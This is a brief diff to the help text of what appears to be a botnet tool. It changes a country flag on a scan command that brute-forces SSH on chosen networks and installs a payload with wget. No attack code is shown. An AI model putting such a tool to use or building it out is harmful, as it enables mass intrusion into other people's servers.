@@ -29,7 +29,7 @@ SCAN FUNCTION:
 	?scan <network> <server>		Scan SSH port on the network, brute-force attack to the target and install the payload by "wget".
 
 		-cn		Scan on china network.
-		-usa		Scan on the united state of america network.
+		-hk		Scan on hong kong network.
 		-kr		Scan on south korea network.
 		-br		Scan on brazil network.
 		-r		Scan with random ip.
